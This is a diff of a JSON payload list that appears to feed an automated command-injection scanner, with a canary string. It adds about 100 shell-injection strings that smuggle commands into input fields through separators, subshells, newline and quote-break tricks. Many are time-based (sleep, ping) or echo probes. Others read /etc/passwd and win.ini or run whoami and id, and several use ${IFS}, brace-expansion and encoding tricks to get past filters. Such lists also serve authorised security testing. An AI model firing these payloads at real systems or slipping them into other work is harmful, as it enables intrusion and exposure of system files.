@@ -1,169 +1,117 @@
 {
     "canary": "rce_test_8888",
     "payloads": [
-        {
-            "payload": "; echo $((9999-1111))",
-            "type": "Linux math echo semicolon"
-        },
-        {
-            "payload": "| echo $((9999-1111))",
-            "type": "Linux math echo pipe"
-        },
-        {
-            "payload": "|| echo $((9999-1111))",
-            "type": "Linux math echo OR"
-        },
-        {
-            "payload": "`echo $((9999-1111))`",
-            "type": "Linux math backtick"
-        },
-        {
-            "payload": "$(echo $((9999-1111)))",
-            "type": "Linux math subshell"
-        },
-        {
-            "payload": "; echo rce_test_8888",
-            "type": "Linux pure echo semicolon"
-        },
-        {
-            "payload": "| echo rce_test_8888",
-            "type": "Linux pure echo pipe"
-        },
-        {
-            "payload": "& echo rce_test_8888",
-            "type": "Windows pure echo ampersand"
-        },
-        {
-            "payload": "| echo rce_test_8888",
-            "type": "Windows pure echo pipe"
-        },
-        {
-            "payload": "; sleep 3",
-            "type": "Linux sleep semicolon"
-        },
-        {
-            "payload": "| sleep 3",
-            "type": "Linux sleep pipe"
-        },
-        {
-            "payload": "|| sleep 3",
-            "type": "Linux sleep double-OR"
-        },
-        {
-            "payload": "|| sleep 3 ||",
-            "type": "Linux sleep double-OR wrapped"
-        },
-        {
-            "payload": "`sleep 3`",
-            "type": "Linux sleep backtick"
-        },
-        {
-            "payload": "$(sleep 3)",
-            "type": "Linux sleep subshell"
-        },
-        {
-            "payload": "; sleep 10",
-            "type": "Linux sleep 10s semicolon"
-        },
-        {
-            "payload": "| sleep 10",
-            "type": "Linux sleep 10s pipe"
-        },
-        {
-            "payload": "|| sleep 10 ||",
-            "type": "Linux sleep 10s double-OR wrapped"
-        },
-        {
-            "payload": "; ping -c 3 127.0.0.1",
-            "type": "Linux ping delay"
-        },
-        {
-            "payload": "| ping -c 3 127.0.0.1",
-            "type": "Linux ping pipe delay"
-        },
-        {
-            "payload": "|| ping -c 3 127.0.0.1 ||",
-            "type": "Linux ping double-OR wrapped"
-        },
-        {
-            "payload": "|| ping -c 10 127.0.0.1 ||",
-            "type": "Linux ping 10s double-OR wrapped"
-        },
-        {
-            "payload": "| ping -n 3 127.0.0.1",
-            "type": "Windows ping delay"
-        },
-        {
-            "payload": "|| ping -n 3 127.0.0.1 ||",
-            "type": "Windows ping double-OR wrapped"
-        },
-        {
-            "payload": "& ping -n 3 127.0.0.1 &",
-            "type": "Windows ping ampersand wrapped"
-        },
-        {
-            "payload": "; cat /etc/passwd",
-            "type": "Linux read passwd semicolon"
-        },
-        {
-            "payload": "| cat /etc/passwd",
-            "type": "Linux read passwd pipe"
-        },
-        {
-            "payload": "; type C:\\Windows\\win.ini",
-            "type": "Windows read win.ini semicolon"
-        },
-        {
-            "payload": "| type C:\\Windows\\win.ini",
-            "type": "Windows read win.ini pipe"
-        },
-        {
-            "payload": "|| whoami ||",
-            "type": "Linux whoami double-OR wrapped"
-        },
-        {
-            "payload": "; whoami",
-            "type": "Linux whoami semicolon"
-        },
-        {
-            "payload": "| whoami",
-            "type": "Linux whoami pipe"
-        },
-        {
-            "payload": "& whoami",
-            "type": "Windows whoami ampersand"
-        },
-        {
-            "payload": "; id",
-            "type": "Linux id semicolon"
-        },
-        {
-            "payload": "| id",
-            "type": "Linux id pipe"
-        },
-        {
-            "payload": "&& id",
-            "type": "Linux id double-AND"
-        },
-        {
-            "payload": "%0a sleep 3",
-            "type": "Linux newline sleep"
-        },
-        {
-            "payload": "%0a ping -c 3 127.0.0.1",
-            "type": "Linux newline ping"
-        },
-        {
-            "payload": "\n sleep 3",
-            "type": "Linux literal newline sleep"
-        },
-        {
-            "payload": "'; sleep 3; '",
-            "type": "Linux quote-break sleep"
-        },
-        {
-            "payload": "\"; sleep 3; \"",
-            "type": "Linux dquote-break sleep"
-        }
+        {"payload": "; echo $((9999-1111))", "type": "Linux math echo semicolon"},
+        {"payload": "| echo $((9999-1111))", "type": "Linux math echo pipe"},
+        {"payload": "|| echo $((9999-1111))", "type": "Linux math echo OR"},
+        {"payload": "`echo $((9999-1111))`", "type": "Linux math backtick"},
+        {"payload": "$(echo $((9999-1111)))", "type": "Linux math subshell"},
+
+        {"payload": "; echo $((1234+5678))", "type": "Linux math echo semicolon (verification)"},
+        {"payload": "| echo $((1234+5678))", "type": "Linux math echo pipe (verification)"},
+        {"payload": "|| echo $((1234+5678))", "type": "Linux math echo OR (verification)"},
+        {"payload": "`echo $((1234+5678))`", "type": "Linux math backtick (verification)"},
+        {"payload": "$(echo $((1234+5678)))", "type": "Linux math subshell (verification)"},
+
+        {"payload": "; echo rce_test_8888", "type": "Linux pure echo semicolon"},
+        {"payload": "| echo rce_test_8888", "type": "Linux pure echo pipe"},
+        {"payload": "|| echo rce_test_8888", "type": "Linux pure echo OR"},
+        {"payload": "& echo rce_test_8888", "type": "Windows pure echo ampersand"},
+        {"payload": "| echo rce_test_8888", "type": "Windows pure echo pipe"},
+        {"payload": "&& echo rce_test_8888", "type": "Linux pure echo double-AND"},
+
+        {"payload": "; sleep 5", "type": "Linux sleep semicolon"},
+        {"payload": "| sleep 5", "type": "Linux sleep pipe"},
+        {"payload": "|| sleep 5", "type": "Linux sleep double-OR"},
+        {"payload": "|| sleep 5 ||", "type": "Linux sleep double-OR wrapped"},
+        {"payload": "&& sleep 5", "type": "Linux sleep double-AND"},
+        {"payload": "& sleep 5", "type": "Linux sleep background-AND"},
+        {"payload": "`sleep 5`", "type": "Linux sleep backtick"},
+        {"payload": "$(sleep 5)", "type": "Linux sleep subshell"},
+
+        {"payload": "; sleep 10", "type": "Linux sleep 10s semicolon"},
+        {"payload": "| sleep 10", "type": "Linux sleep 10s pipe"},
+        {"payload": "|| sleep 10", "type": "Linux sleep 10s double-OR"},
+        {"payload": "|| sleep 10 ||", "type": "Linux sleep 10s double-OR wrapped"},
+
+        {"payload": "; ping -c 5 127.0.0.1", "type": "Linux ping semicolon"},
+        {"payload": "| ping -c 5 127.0.0.1", "type": "Linux ping pipe"},
+        {"payload": "|| ping -c 5 127.0.0.1", "type": "Linux ping double-OR"},
+        {"payload": "|| ping -c 5 127.0.0.1 ||", "type": "Linux ping double-OR wrapped"},
+        {"payload": "|| ping -c 10 127.0.0.1 ||", "type": "Linux ping 10s double-OR wrapped"},
+        {"payload": "`ping -c 5 127.0.0.1`", "type": "Linux ping backtick"},
+        {"payload": "$(ping -c 5 127.0.0.1)", "type": "Linux ping subshell"},
+
+        {"payload": "| ping -n 5 127.0.0.1", "type": "Windows ping pipe"},
+        {"payload": "|| ping -n 5 127.0.0.1 ||", "type": "Windows ping double-OR wrapped"},
+        {"payload": "& ping -n 5 127.0.0.1", "type": "Windows ping ampersand"},
+        {"payload": "& ping -n 5 127.0.0.1 &", "type": "Windows ping ampersand wrapped"},
+        {"payload": "&& ping -n 5 127.0.0.1", "type": "Windows ping double-AND"},
+
+        {"payload": "; cat /etc/passwd", "type": "Linux read passwd semicolon"},
+        {"payload": "| cat /etc/passwd", "type": "Linux read passwd pipe"},
+        {"payload": "|| cat /etc/passwd", "type": "Linux read passwd OR"},
+        {"payload": "`cat /etc/passwd`", "type": "Linux read passwd backtick"},
+        {"payload": "$(cat /etc/passwd)", "type": "Linux read passwd subshell"},
+        {"payload": "; type C:\\Windows\\win.ini", "type": "Windows read win.ini semicolon"},
+        {"payload": "| type C:\\Windows\\win.ini", "type": "Windows read win.ini pipe"},
+        {"payload": "& type C:\\Windows\\win.ini", "type": "Windows read win.ini ampersand"},
+
+        {"payload": "; whoami", "type": "Linux whoami semicolon"},
+        {"payload": "| whoami", "type": "Linux whoami pipe"},
+        {"payload": "|| whoami", "type": "Linux whoami double-OR"},
+        {"payload": "|| whoami ||", "type": "Linux whoami double-OR wrapped"},
+        {"payload": "`whoami`", "type": "Linux whoami backtick"},
+        {"payload": "$(whoami)", "type": "Linux whoami subshell"},
+        {"payload": "& whoami", "type": "Windows whoami ampersand"},
+        {"payload": "&& whoami", "type": "Windows whoami double-AND"},
+
+        {"payload": "; id", "type": "Linux id semicolon"},
+        {"payload": "| id", "type": "Linux id pipe"},
+        {"payload": "|| id", "type": "Linux id double-OR"},
+        {"payload": "&& id", "type": "Linux id double-AND"},
+        {"payload": "`id`", "type": "Linux id backtick"},
+        {"payload": "$(id)", "type": "Linux id subshell"},
+
+        {"payload": "%0a sleep 5", "type": "Linux newline sleep"},
+        {"payload": "%0a ping -c 5 127.0.0.1", "type": "Linux newline ping"},
+        {"payload": "%0a echo rce_test_8888", "type": "Linux newline echo"},
+        {"payload": "%0a id", "type": "Linux newline id"},
+        {"payload": "%0d%0a sleep 5", "type": "Linux CRLF sleep"},
+        {"payload": "\n sleep 5", "type": "Linux literal newline sleep"},
+        {"payload": "\n echo rce_test_8888", "type": "Linux literal newline echo"},
+        {"payload": "\n id", "type": "Linux literal newline id"},
+
+        {"payload": "'; sleep 5; '", "type": "Linux quote-break sleep"},
+        {"payload": "\"; sleep 5; \"", "type": "Linux dquote-break sleep"},
+        {"payload": "'; echo rce_test_8888; '", "type": "Linux quote-break echo"},
+        {"payload": "\"; echo rce_test_8888; \"", "type": "Linux dquote-break echo"},
+        {"payload": "'; ping -c 5 127.0.0.1; '", "type": "Linux quote-break ping"},
+        {"payload": "\"; ping -c 5 127.0.0.1; \"", "type": "Linux dquote-break ping"},
+        {"payload": "'; id; '", "type": "Linux quote-break id"},
+        {"payload": "\"; id; \"", "type": "Linux dquote-break id"},
+
+        {"payload": "x]||sleep 5||[x", "type": "Linux bracket-escape sleep"},
+        {"payload": "x]||ping -c 5 127.0.0.1||[x", "type": "Linux bracket-escape ping"},
+        {"payload": "x`sleep 5`x", "type": "Linux inline backtick sleep"},
+        {"payload": "x$(sleep 5)x", "type": "Linux inline subshell sleep"},
+        {"payload": "x`echo rce_test_8888`x", "type": "Linux inline backtick echo"},
+        {"payload": "x$(echo rce_test_8888)x", "type": "Linux inline subshell echo"},
+
+        {"payload": "|| sleep 5 #", "type": "Linux sleep comment-end"},
+        {"payload": "|| ping -c 5 127.0.0.1 #", "type": "Linux ping comment-end"},
+        {"payload": "|| echo rce_test_8888 #", "type": "Linux echo comment-end"},
+        {"payload": "& sleep 5 &", "type": "Linux sleep bg wrapped"},
+        {"payload": "; sleep 5 ;", "type": "Linux sleep semicolon wrapped"},
+
+        {"payload": "${IFS}sleep${IFS}5", "type": "Linux IFS-bypass sleep"},
+        {"payload": ";${IFS}sleep${IFS}5", "type": "Linux IFS-bypass semicolon sleep"},
+        {"payload": "|${IFS}sleep${IFS}5", "type": "Linux IFS-bypass pipe sleep"},
+        {"payload": ";sl${RANDOM:0:0}eep${IFS}5", "type": "Linux var-insert sleep"},
+        {"payload": "$({sleep,5})", "type": "Linux brace-expansion sleep"},
+
+        {"payload": "x||ping+-c+5+127.0.0.1||", "type": "Linux plus-encoded ping double-OR"},
+        {"payload": "x||sleep+5||", "type": "Linux plus-encoded sleep double-OR"},
+        {"payload": "x||echo+rce_test_8888||", "type": "Linux plus-encoded echo double-OR"}
     ]
 }
